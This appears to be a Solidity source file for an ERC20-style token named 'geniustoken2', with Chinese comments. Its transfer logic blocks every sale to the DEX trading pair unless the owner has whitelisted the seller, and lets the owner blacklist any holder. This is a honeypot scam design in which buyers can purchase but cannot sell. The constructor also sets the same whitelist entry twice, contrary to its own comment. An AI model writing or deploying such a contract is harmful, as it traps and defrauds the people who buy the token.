
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract geniustoken2 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public owner;
    address public pair; // ⭐ DEX 交易对地址

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public blackList;
    mapping(address => bool) public whiteList;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    constructor(
        string memory _name,
        string memory _symbol
    ) {
        name = _name;
        symbol = _symbol;
        owner = msg.sender;

        uint256 supply = 1_000_000 * 1e18;
        totalSupply = supply;
        balanceOf[msg.sender] = supply;

        // 部署者 & 接收者默认白名单
        whiteList[msg.sender] = true;
        whiteList[msg.sender] = true;

        emit Transfer(address(0), msg.sender, supply);
    }

    // =====================
    // 管理函数
    // =====================

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }

    function setWhiteList(address user, bool status) external onlyOwner {
        whiteList[user] = status;
    }

    function batchSetWhiteList(address[] calldata users, bool status)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < users.length; i++) {
            whiteList[users[i]] = status;
        }
    }

    function setBlackList(address user, bool status) external onlyOwner {
        blackList[user] = status;
    }

    // =====================
    // ERC20
    // =====================

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ALLOWANCE_LOW");

        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }

        _transfer(from, to, amount);
        return true;
    }

    // =====================
    // 核心卖出限制逻辑
    // =====================

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(!blackList[from], "SENDER_BLACKLISTED");
        require(!blackList[to], "RECEIVER_BLACKLISTED");
        require(balanceOf[from] >= amount, "BALANCE_LOW");

        // ⭐ 关键：卖给 DEX Pair 才检查白名单
        if (to == pair) {
            require(whiteList[from], "ONLY_WHITELIST_CAN_SELL");
        }

        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }

        emit Transfer(from, to, amount);
    }
}
